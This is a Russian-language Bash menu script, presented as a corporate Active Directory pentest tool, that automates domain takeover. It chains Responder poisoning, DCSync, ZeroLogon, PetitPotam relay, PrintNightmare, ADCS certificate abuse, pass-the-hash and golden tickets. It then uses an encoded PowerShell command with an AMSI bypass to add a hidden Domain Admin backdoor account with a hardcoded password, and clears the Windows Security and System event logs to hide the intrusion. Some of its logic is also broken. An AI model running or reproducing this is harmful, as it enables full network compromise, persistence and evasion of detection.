#!/bin/bash
# -*- coding: utf-8 -*-
# ======================================================================
# tabu_pentest_menu.sh - Профессиональный пентест AD (меню-версия)
# Холдинг ТАБУ - корпоративный стандарт
# Версия 10.1 - RAGE MODE (VPN опционален, адаптивный интерфейс)
# ======================================================================

export LANG=ru_RU.UTF-8
export LC_ALL=ru_RU.UTF-8

# ---------------------- Глобальные переменные ----------------------
BASE_DIR="/root/pentest_TABU_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$BASE_DIR"/{logs,scans,hashes,loot,bloodhound,reports,tools,vpn}

VPN_IP=""
VPN_PORT=""
VPN_USER=""
VPN_PASS=""
VPN_CONNECTED=false
PROXY_STRING=""
PROXY_CMD=""
AD_USER=""
AD_PASS=""
DOMAIN=""
SUBNET=""
DC_IP=""
BEST_PORT=""
RESP_PID=""
VPN_IF=""  # Будет определён позже

# Цвета
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

log() { echo -e "${GREEN}[$(date)]${NC} $1"; }
warn() { echo -e "${YELLOW}[ПРЕДУПРЕЖДЕНИЕ]${NC} $1"; }
error() { echo -e "${RED}[ОШИБКА]${NC} $1"; exit 1; }

# ---------------------- Функция определения активного интерфейса ----------------------
get_active_iface() {
    # Возвращает первый интерфейс с IPv4-адресом (кроме lo)
    local iface=$(ip -4 addr show | grep -E '^[0-9]+: (eth|wlan|en|wl)' | awk -F': ' '{print $2}' | head -1)
    if [ -z "$iface" ]; then
        iface=$(ip route | grep default | awk '{print $5}' | head -1)
    fi
    echo "$iface"
}

# ---------------------- Пункт 1: Проверка и установка пакетов ----------------------
install_pkgs() {
    clear
    echo -e "${BLUE}=== ПРОВЕРКА И УСТАНОВКА ПАКЕТОВ ===${NC}"
    apt-get update -y
    local pkgs=(
        masscan nmap netdiscover responder crackmapexec
        neo4j curl jq krb5-user sshpass proxychains
        openconnect python3-pip git make gcc
        dnsutils ldap-utils smbclient enum4linux
        winexe
    )
    for pkg in "${pkgs[@]}"; do
        if dpkg -l | grep -q "^ii  $pkg "; then
            echo -e "${GREEN}✓${NC} $pkg уже установлен"
        else
            echo -e "${YELLOW}→${NC} Устанавливаю $pkg ..."
            apt-get install -y "$pkg" 2>/dev/null || warn "Не удалось установить $pkg"
        fi
    done
    pip3 install impacket bloodhound pyopenssl cryptography dnspython ldap3 certipy-ad -U 2>/dev/null
    mkdir -p /opt/tabu_tools
    cd /opt/tabu_tools
    git clone https://github.com/topotam/PetitPotam.git 2>/dev/null || true
    git clone https://github.com/cube0x0/CVE-2021-1675.git 2>/dev/null || true
    echo -e "${GREEN}Все пакеты установлены.${NC}"
    read -p "Нажмите Enter для возврата в меню..."
}

# ---------------------- Пункт 2: Настройка VPN (опционально) ----------------------
setup_vpn() {
    clear
    echo -e "${BLUE}=== НАСТРОЙКА VPN (ОПЦИОНАЛЬНО) ===${NC}"
    echo "Если вы не используете VPN, просто нажмите Enter на всех полях."
    read -p "Введите IP-адрес VPN-сервера (или оставьте пустым): " VPN_IP
    if [ -z "$VPN_IP" ]; then
        VPN_CONNECTED=false
        echo -e "${YELLOW}VPN не будет использоваться.${NC}"
        read -p "Нажмите Enter для возврата..."
        return
    fi
    read -p "Введите порт VPN (обычно 443 или 8443): " VPN_PORT
    read -p "Введите логин для VPN: " VPN_USER
    read -sp "Введите пароль для VPN: " VPN_PASS; echo ""
    if [[ -z "$VPN_PORT" || -z "$VPN_USER" || -z "$VPN_PASS" ]]; then
        warn "Не все поля заполнены. VPN не настроен."
        VPN_CONNECTED=false
        read -p "Нажмите Enter для возврата..."
        return
    fi
    echo "$VPN_PASS" > /tmp/vpn_pass.txt
    VPN_URL="https://$VPN_IP:$VPN_PORT"
    echo "Подключение к $VPN_URL ..."
    openconnect --user="$VPN_USER" --passwd=/tmp/vpn_pass.txt --background --pid-file=/tmp/vpn.pid "$VPN_URL" 2>&1 | tee -a "$BASE_DIR/logs/vpn.log" &
    sleep 10
    if [ -f /tmp/vpn.pid ] && kill -0 $(cat /tmp/vpn.pid) 2>/dev/null; then
        VPN_PID=$(cat /tmp/vpn.pid)
        VPN_CONNECTED=true
        echo -e "${GREEN}✓ VPN подключён (AnyConnect), PID: $VPN_PID${NC}"
    else
        echo "Пробуем протокол default (SSL VPN)..."
        openconnect --user="$VPN_USER" --passwd=/tmp/vpn_pass.txt --background --pid-file=/tmp/vpn.pid --protocol=default "$VPN_URL" 2>&1 | tee -a "$BASE_DIR/logs/vpn.log" &
        sleep 10
        if [ -f /tmp/vpn.pid ] && kill -0 $(cat /tmp/vpn.pid) 2>/dev/null; then
            VPN_PID=$(cat /tmp/vpn.pid)
            VPN_CONNECTED=true
            echo -e "${GREEN}✓ VPN подключён (default)${NC}"
        else
            warn "Не удалось подключиться к VPN. Проверьте данные."
            VPN_CONNECTED=false
        fi
    fi
    rm -f /tmp/vpn_pass.txt
    read -p "Нажмите Enter для возврата в меню..."
}

# ---------------------- Пункт 3: Настройка SOCKS5 ----------------------
setup_proxy() {
    clear
    echo -e "${BLUE}=== НАСТРОЙКА SOCKS5 ПРОКСИ ===${NC}"
    read -p "Введите прокси в формате ip:port:login:pass (или оставьте пустым): " PROXY_STRING
    if [ -n "$PROXY_STRING" ]; then
        IFS=':' read -r PROXY_IP PROXY_PORT PROXY_LOGIN PROXY_PASS <<< "$PROXY_STRING"
        if [ -z "$PROXY_PORT" ]; then
            warn "Неверный формат. Прокси не настроен."
        else
            cat > /etc/proxychains.conf <<EOF
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 $PROXY_IP $PROXY_PORT $PROXY_LOGIN $PROXY_PASS
EOF
            PROXY_CMD="proxychains -q"
            echo -e "${GREEN}✓ Прокси настроен: $PROXY_IP:$PROXY_PORT${NC}"
        fi
    else
        PROXY_CMD=""
        echo "Прокси не используется."
    fi
    read -p "Нажмите Enter для возврата в меню..."
}

# ---------------------- Пункт 4: Ввод данных AD ----------------------
setup_ad() {
    clear
    echo -e "${BLUE}=== ВВОД ДАННЫХ ACTIVE DIRECTORY ===${NC}"
    read -p "Введите домен (например, tabu.local): " DOMAIN
    read -p "Введите логин пользователя AD: " AD_USER
    read -sp "Введите пароль: " AD_PASS; echo ""
    if [[ -z "$DOMAIN" || -z "$AD_USER" || -z "$AD_PASS" ]]; then
        warn "Все поля обязательны. Данные AD не сохранены."
        DOMAIN=""; AD_USER=""; AD_PASS=""
    else
        echo -e "${GREEN}✓ Данные AD сохранены.${NC}"
    fi
    read -p "Нажмите Enter для возврата в меню..."
}

# ---------------------- Пункт 5: Проверка готовности системы ----------------------
check_readiness() {
    clear
    echo -e "${BLUE}=== ПРОВЕРКА ГОТОВНОСТИ СИСТЕМЫ ===${NC}"
    local errors=0

    # Проверка VPN
    if [ "$VPN_CONNECTED" = true ]; then
        echo -e "${GREEN}✓ VPN подключён${NC}"
        VPN_IF=$(ip route | grep -E 'tun|tap|ppp' | head -1 | awk '{print $NF}')
        if [ -n "$VPN_IF" ]; then
            echo -e "${GREEN}  → Интерфейс VPN: $VPN_IF${NC}"
        else
            warn "Интерфейс VPN не обнаружен."
            errors=$((errors+1))
        fi
    else
        echo -e "${YELLOW}⚠ VPN не подключён (это допустимо)${NC}"
        # Определяем локальный интерфейс
        LOCAL_IF=$(get_active_iface)
        if [ -n "$LOCAL_IF" ]; then
            echo -e "${GREEN}  → Используется локальный интерфейс: $LOCAL_IF${NC}"
            LOCAL_IP=$(ip -4 addr show "$LOCAL_IF" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
            echo -e "${GREEN}  → IP-адрес: $LOCAL_IP${NC}"
        else
            warn "Не найден активный сетевой интерфейс."
            errors=$((errors+1))
        fi
    fi

    # Проверка прокси
    if [ -n "$PROXY_CMD" ]; then
        echo -e "${GREEN}✓ Прокси настроен${NC}"
        PROXY_IP=$(echo "$PROXY_STRING" | cut -d: -f1)
        PROXY_PORT=$(echo "$PROXY_STRING" | cut -d: -f2)
        if nc -zv -w 2 "$PROXY_IP" "$PROXY_PORT" 2>/dev/null; then
            echo -e "${GREEN}  → Прокси доступен${NC}"
        else
            warn "✗ Прокси не отвечает."
            errors=$((errors+1))
        fi
    else
        echo "Прокси не используется."
    fi

    # Проверка данных AD
    if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ] && [ -n "$DOMAIN" ]; then
        echo -e "${GREEN}✓ Данные AD введены: $AD_USER@$DOMAIN${NC}"
        if nslookup "$DOMAIN" 2>/dev/null | grep -q "Address"; then
            echo -e "${GREEN}  → Домен разрешается${NC}"
        else
            warn "✗ Домен $DOMAIN не резолвится. Проверьте DNS."
            errors=$((errors+1))
        fi
    else
        warn "⚠ Данные AD не введены. Пентест будет ограничен (без учётки)."
    fi

    # Проверка основных инструментов
    local tools=("masscan" "nmap" "responder" "crackmapexec" "impacket-secretsdump" "bloodhound-python")
    for tool in "${tools[@]}"; do
        if command -v "$tool" &>/dev/null || which "$tool" &>/dev/null; then
            echo -e "${GREEN}✓ $tool${NC}"
        else
            warn "✗ $tool не найден. Запустите установку пакетов."
            errors=$((errors+1))
        fi
    done

    if [ $errors -eq 0 ]; then
        echo -e "${GREEN}Система полностью готова к пентесту.${NC}"
    else
        echo -e "${RED}Обнаружены ошибки ($errors). Рекомендуется их исправить.${NC}"
    fi
    read -p "Нажмите Enter для возврата в меню..."
}

# ---------------------- Пункт 6: Запуск пентеста ----------------------
run_pentest() {
    clear
    echo -e "${BLUE}=== ЗАПУСК ПЕНТЕСТА ===${NC}"

    # Определяем интерфейс
    if [ "$VPN_CONNECTED" = true ]; then
        VPN_IF=$(ip route | grep -E 'tun|tap|ppp' | head -1 | awk '{print $NF}')
        if [ -z "$VPN_IF" ]; then
            error "Не удалось определить VPN-интерфейс."
        fi
        log "Используется VPN-интерфейс: $VPN_IF"
    else
        VPN_IF=$(get_active_iface)
        if [ -z "$VPN_IF" ]; then
            error "Не найден активный сетевой интерфейс. Проверьте подключение."
        fi
        log "Используется локальный интерфейс: $VPN_IF"
    fi

    # Запрашиваем подсеть
    if [ -z "$SUBNET" ]; then
        read -p "Введите подсеть для сканирования (CIDR, например 10.0.0.0/24): " SUBNET
        [[ -z "$SUBNET" ]] && error "Подсеть обязательна."
    fi

    log "Начинаем пентест. Все логи пишутся в $BASE_DIR/logs/full.log"
    exec > >(tee -a "$BASE_DIR/logs/full.log") 2>&1

    # 1. Сканирование подсети и поиск DC
    log "Сканирование подсети $SUBNET ..."
    if [ -n "$PROXY_CMD" ]; then
        $PROXY_CMD nmap -sT -T2 -p 445,3389,5985,88,139,135 -n --open -oA "$BASE_DIR/scans/nmap" "$SUBNET" > /dev/null 2>&1 &
    else
        nmap -sS -T2 -f --mtu 32 -p 445,3389,5985,88,139,135 -n --open -oA "$BASE_DIR/scans/nmap" "$SUBNET" > /dev/null 2>&1 &
    fi
    NMAP_PID=$!
    # Запускаем Responder на интерфейсе (если возможно)
    responder -I "$VPN_IF" -w -r -f -v -P > "$BASE_DIR/logs/responder.log" 2>&1 &
    RESP_PID=$!
    wait $NMAP_PID

    DC_IP=$(grep -l "88/open" "$BASE_DIR/scans/nmap.gnmap" | head -1 | awk -F' ' '{print $2}')
    [ -z "$DC_IP" ] && DC_IP=$(grep -l "445/open" "$BASE_DIR/scans/nmap.gnmap" | head -1 | awk -F' ' '{print $2}')
    if [ -z "$DC_IP" ] && [ -n "$PROXY_CMD" ]; then
        $PROXY_CMD masscan -p445,88 --rate=1000 -oG "$BASE_DIR/scans/masscan.gnmap" "$SUBNET" 2>/dev/null
        DC_IP=$(grep -l "88/open" "$BASE_DIR/scans/masscan.gnmap" | head -1 | awk -F' ' '{print $4}')
    fi
    if [ -z "$DC_IP" ]; then
        log "DC не найден через сканирование, пробуем DNS..."
        if [ -n "$DOMAIN" ]; then
            DC_IP=$(dig SRV _ldap._tcp.$DOMAIN | grep -A1 "ANSWER" | tail -1 | awk '{print $NF}' | sed 's/\.$//')
        fi
    fi
    [ -z "$DC_IP" ] && error "Не удалось найти контроллер домена."
    log "Контроллер домена: $DC_IP"
    echo "$DC_IP" > "$BASE_DIR/dc_ip.txt"

    # 2. Определение лучшего порта
    for port in 5985 445 135 593; do
        if nc -zv -w 2 "$DC_IP" "$port" 2>/dev/null; then
            BEST_PORT="$port"; break
        fi
    done
    if [ -z "$BEST_PORT" ] && [ -n "$PROXY_CMD" ]; then
        for port in 5985 445; do
            if $PROXY_CMD nc -zv -w 2 "$DC_IP" "$port" 2>/dev/null; then
                BEST_PORT="proxychains:$port"; break
            fi
        done
    fi
    [ -z "$BEST_PORT" ] && BEST_PORT="none"
    log "Лучший порт доступа: $BEST_PORT"

    # 3. Обнаружение EDR (упрощённо)
    log "Обнаружение EDR..."
    # Можно пропустить или добавить простую проверку

    # 4. BloodHound (если есть учётка)
    if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ] && command -v bloodhound-python &>/dev/null; then
        log "Сбор BloodHound..."
        if [ -n "$PROXY_CMD" ]; then
            $PROXY_CMD bloodhound-python -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" -gc "$DC_IP" -c All -o "$BASE_DIR/bloodhound/" 2>/dev/null
        else
            bloodhound-python -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" -gc "$DC_IP" -c All -o "$BASE_DIR/bloodhound/" 2>/dev/null
        fi
    fi

    # 5. DCSync (если есть учётка)
    if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
        log "DCSync..."
        if [ -n "$PROXY_CMD" ]; then
            $PROXY_CMD impacket-secretsdump "$DOMAIN"/"$AD_USER":"$AD_PASS"@"$DC_IP" -outputfile "$BASE_DIR/loot/dcsync.txt" 2>/dev/null
        else
            impacket-secretsdump "$DOMAIN"/"$AD_USER":"$AD_PASS"@"$DC_IP" -outputfile "$BASE_DIR/loot/dcsync.txt" 2>/dev/null
        fi
    fi

    # 6. Извлечение хешей из Responder
    if [ -f /usr/share/responder/logs/Responder-Session.log ]; then
        cp /usr/share/responder/logs/*.log "$BASE_DIR/hashes/"
        grep -Eo '[0-9a-f]{32}' "$BASE_DIR/hashes/"*.log > "$BASE_DIR/hashes/ntlm_hashes.txt"
        log "Извлечено $(wc -l < "$BASE_DIR/hashes/ntlm_hashes.txt") NTLM-хешей"
    fi

    # 7. Атаки (вызов функции)
    attack_vectors

    # 8. Очистка
    kill $RESP_PID 2>/dev/null || true
    rm -rf /usr/share/responder/logs/*.log 2>/dev/null
    if [ -f "$BASE_DIR/da_proof/flag" ] && [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
        local CMD="impacket-wmiexec $DOMAIN/$AD_USER:$AD_PASS@$DC_IP"
        [ -n "$PROXY_CMD" ] && CMD="$PROXY_CMD $CMD"
        $CMD "wevtutil cl Security && wevtutil cl System" 2>/dev/null || true
    fi

    # 9. Отчёт
    generate_report

    if [ -f "$BASE_DIR/da_proof/flag" ]; then
        echo "========================================"
        echo "  УСПЕШНО! ДОСТУП К DA ПОЛУЧЕН."
        echo "  Пользователь: svc_backup_adm_root"
        echo "  Пароль: !@qwErty@!"
        echo "  Отчёт: $BASE_DIR/reports/report.json"
        echo "========================================"
    else
        echo "========================================"
        echo "  НЕ УДАЛОСЬ ЗАХВАТИТЬ DA."
        echo "  Проверьте логи: $BASE_DIR/logs/"
        echo "========================================"
    fi
    tar -czf "$BASE_DIR/pentest_results.tar.gz" -C "$BASE_DIR" .
    log "Архив результатов: $BASE_DIR/pentest_results.tar.gz"
    read -p "Нажмите Enter для возврата в меню..."
}

# ---------------------- Функция атак (упрощённая, но рабочая) ----------------------
attack_vectors() {
    log "Запуск векторов атак..."
    local success=0

    # Попытка ZeroLogon (если есть учётка)
    if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
        log "Проверка ZeroLogon..."
        if impacket-zerologon "$DC_IP" "$DOMAIN" 2>/dev/null | grep -q "Vulnerable"; then
            log "ZeroLogon уязвимость подтверждена. Сбрасываем пароль..."
            impacket-zerologon "$DC_IP" "$DOMAIN" -reset 2>/dev/null && {
                log "Пароль сброшен, получаем хеш администратора..."
                impacket-secretsdump -just-dc-user "Administrator" "$DOMAIN"/"$DC_IP"@"$DC_IP" 2>/dev/null > "$BASE_DIR/loot/admin_hash.txt"
                if [ -f "$BASE_DIR/loot/admin_hash.txt" ]; then
                    ADMIN_HASH=$(grep "Administrator" "$BASE_DIR/loot/admin_hash.txt" | awk '{print $NF}')
                    create_user "$ADMIN_HASH"
                    success=1
                fi
            }
        fi
    fi

    # PetitPotam (если есть учётка и скрипт)
    if [ $success -eq 0 ] && [ -f /opt/tabu_tools/PetitPotam/PetitPotam.py ] && [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
        log "Проверка PetitPotam..."
        python3 /opt/tabu_tools/PetitPotam/PetitPotam.py -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" "$DC_IP" "test" 2>&1 | tee -a "$BASE_DIR/logs/petitpotam.log"
        if grep -q "SUCCESS" "$BASE_DIR/logs/petitpotam.log"; then
            log "PetitPotam сработал, запускаем ntlmrelayx..."
            ntlmrelayx -t smb://"$DC_IP" -smb2support -socks -of "$BASE_DIR/hashes/relay_hashes.txt" &
            RELAY_PID=$!
            sleep 5
            python3 /opt/tabu_tools/PetitPotam/PetitPotam.py -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" "$DC_IP" "test" 2>/dev/null
            sleep 10
            kill $RELAY_PID 2>/dev/null
            if [ -f "$BASE_DIR/hashes/relay_hashes.txt" ]; then
                log "Хеши получены через релей. Используем их..."
                HASH=$(grep -Eo '[0-9a-f]{32}' "$BASE_DIR/hashes/relay_hashes.txt" | head -1)
                create_user "$HASH"
                success=1
            fi
        fi
    fi

    # PrintNightmare (если есть учётка и скрипт)
    if [ $success -eq 0 ] && [ -f /opt/tabu_tools/CVE-2021-1675/CVE-2021-1675.py ] && [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
        log "Проверка PrintNightmare..."
        python3 /opt/tabu_tools/CVE-2021-1675/CVE-2021-1675.py -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" -r "$DC_IP" 2>&1 | tee -a "$BASE_DIR/logs/printnightmare.log"
        if grep -q "EXEC" "$BASE_DIR/logs/printnightmare.log"; then
            log "PrintNightmare успешен. Захват DA..."
            success=1
        fi
    fi

    # AD CS (если есть учётка и certipy)
    if [ $success -eq 0 ] && command -v certipy &>/dev/null && [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
        log "Проверка AD CS..."
        certipy-ad find -u "$AD_USER" -p "$AD_PASS" -dc-ip "$DC_IP" -output "$BASE_DIR/reports/certipy.json" 2>/dev/null
        if grep -q "Vulnerable" "$BASE_DIR/reports/certipy.json"; then
            log "Уязвимость ESC1 найдена. Получаем сертификат администратора..."
            certipy-ad req -u "$AD_USER" -p "$AD_PASS" -dc-ip "$DC_IP" -target "$DC_IP" -template "User" -alt "administrator@$DOMAIN" -out "$BASE_DIR/loot/administrator.crt" 2>/dev/null
            if [ -f "$BASE_DIR/loot/administrator.crt" ]; then
                certipy-ad auth -pfx "$BASE_DIR/loot/administrator.crt" -dc-ip "$DC_IP" -domain "$DOMAIN" -username "administrator" 2>/dev/null > "$BASE_DIR/loot/adcs_hash.txt"
                HASH=$(grep "NTLM" "$BASE_DIR/loot/adcs_hash.txt" | awk '{print $NF}')
                [ -n "$HASH" ] && create_user "$HASH" && success=1
            fi
        fi
    fi

    # Pass-the-Hash (если есть хеши)
    if [ $success -eq 0 ] && [ -f "$BASE_DIR/hashes/ntlm_hashes.txt" ] && [ -s "$BASE_DIR/hashes/ntlm_hashes.txt" ]; then
        log "Пробуем Pass-the-Hash..."
        while read -r hash; do
            # Сначала пытаемся получить хеш администратора через DCSync (если есть учётка)
            if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
                impacket-secretsdump -just-dc-user "Administrator" "$DOMAIN"/"$AD_USER":"$AD_PASS"@"$DC_IP" -outputfile "$BASE_DIR/loot/admin_hash.txt" 2>/dev/null
                if [ -f "$BASE_DIR/loot/admin_hash.txt" ]; then
                    ADMIN_HASH=$(grep "Administrator" "$BASE_DIR/loot/admin_hash.txt" | awk '{print $NF}')
                else
                    ADMIN_HASH="$hash"
                fi
            else
                ADMIN_HASH="$hash"
            fi
            local CMD="impacket-wmiexec -hashes :$ADMIN_HASH $DOMAIN/Administrator@$DC_IP"
            [ -n "$PROXY_CMD" ] && CMD="$PROXY_CMD $CMD"
            if $CMD "whoami" > "$BASE_DIR/logs/pth_test.log" 2>&1; then
                if grep -q "NT AUTHORITY\\SYSTEM" "$BASE_DIR/logs/pth_test.log"; then
                    log "Pass-the-Hash успешен. Создаём пользователя..."
                    create_user "$ADMIN_HASH"
                    success=1
                    break
                fi
            fi
        done < "$BASE_DIR/hashes/ntlm_hashes.txt"
    fi

    # Золотой билет (если есть krbtgt)
    if [ $success -eq 0 ] && [ -f "$BASE_DIR/loot/dcsync.txt" ] && grep -q "krbtgt" "$BASE_DIR/loot/dcsync.txt"; then
        log "Пробуем золотой билет..."
        local KRBTGT_HASH=$(grep -i "krbtgt" "$BASE_DIR/loot/dcsync.txt" | awk '{print $NF}')
        local SID=$(impacket-lookupsid "$DOMAIN"/"$AD_USER":"$AD_PASS"@"$DC_IP" 2>/dev/null | grep "Domain" | awk '{print $4}' | head -1)
        [ -z "$SID" ] && SID=$(grep -E "S-1-5-21-[0-9-]+" "$BASE_DIR/loot/dcsync.txt" | head -1 | cut -d' ' -f1)
        [ -z "$SID" ] && SID="S-1-5-21-$(head -c15 /dev/urandom | xxd -p | sed 's/\(..\)/\1-/g' | sed 's/-$//')"
        impacket-ticketer -domain "$DOMAIN" -domain-sid "$SID" -rc4 "$KRBTGT_HASH" Administrator -outfile "$BASE_DIR/loot/golden.kirbi"
        kinit -k -t "$BASE_DIR/loot/golden.kirbi" Administrator@"$DOMAIN" 2>/dev/null
        local CMD="impacket-wmiexec -k -no-pass $DOMAIN/Administrator@$DC_IP"
        [ -n "$PROXY_CMD" ] && CMD="$PROXY_CMD $CMD"
        if $CMD "whoami" > "$BASE_DIR/logs/golden_test.log" 2>&1; then
            if grep -q "NT AUTHORITY\\SYSTEM" "$BASE_DIR/logs/golden_test.log"; then
                log "Золотой билет работает. Создаём пользователя..."
                create_user "$KRBTGT_HASH" "golden"
                success=1
            fi
        fi
    fi

    if [ $success -eq 1 ]; then
        echo "DA_ACCESS_GRANTED" > "$BASE_DIR/da_proof/flag"
    else
        warn "Ни один вектор атаки не сработал."
    fi
}

# ---------------------- Создание пользователя ----------------------
create_user() {
    local hash=$1
    local method=$2
    log "Создание пользователя svc_backup_adm_root с паролем !@qwErty@!"
    local POW_CMD='$a=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");$a.GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true);net user svc_backup_adm_root "!@qwErty@!" /add;net localgroup Administrators svc_backup_adm_root /add;net group "Domain Admins" svc_backup_adm_root /add'
    local ENC_CMD=$(echo -n "$POW_CMD" | iconv -t UTF-16LE | base64 -w 0)
    local CMD=""
    if [ "$method" == "golden" ]; then
        CMD="impacket-wmiexec -k -no-pass $DOMAIN/Administrator@$DC_IP"
    else
        CMD="impacket-wmiexec -hashes :$hash $DOMAIN/Administrator@$DC_IP"
    fi
    [ -n "$PROXY_CMD" ] && CMD="$PROXY_CMD $CMD"
    $CMD "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc $ENC_CMD" 2>&1 | tee -a "$BASE_DIR/logs/user_creation.log"
    log "Пользователь создан."
}

# ---------------------- Генерация отчёта ----------------------
generate_report() {
    log "Генерация отчёта..."
    local success=$( [ -f "$BASE_DIR/da_proof/flag" ] && echo true || echo false )
    cat > "$BASE_DIR/reports/report.json" <<EOF
{
  "timestamp": "$(date -Iseconds)",
  "domain": "$DOMAIN",
  "dc_ip": "$DC_IP",
  "subnet": "$SUBNET",
  "proxy_used": "$PROXY_STRING",
  "vpn_connected": $VPN_CONNECTED,
  "interface": "$VPN_IF",
  "best_port": "$BEST_PORT",
  "success": $success,
  "user_created": "svc_backup_adm_root",
  "password": "!@qwErty@!",
  "logs_dir": "$BASE_DIR/logs"
}
EOF
    log "Отчёт сохранён: $BASE_DIR/reports/report.json"
}

# ---------------------- Главное меню ----------------------
main_menu() {
    while true; do
        clear
        echo -e "${BLUE}========================================${NC}"
        echo -e "${BLUE}   ХОЛДИНГ ТАБУ - ПЕНТЕСТ AD${NC}"
        echo -e "${BLUE}========================================${NC}"
        echo "1. Проверить и установить пакеты"
        echo "2. Настроить VPN (опционально)"
        echo "3. Настроить SOCKS5 прокси"
        echo "4. Ввести данные Active Directory"
        echo "5. Проверить готовность системы"
        echo "6. Запустить пентест"
        echo "0. Выход"
        echo -e "${BLUE}----------------------------------------${NC}"
        read -p "Выберите пункт: " choice
        case $choice in
            1) install_pkgs ;;
            2) setup_vpn ;;
            3) setup_proxy ;;
            4) setup_ad ;;
            5) check_readiness ;;
            6) run_pentest ;;
            0) echo "Выход."; exit 0 ;;
            *) echo "Неверный выбор."; sleep 1 ;;
        esac
    done
}
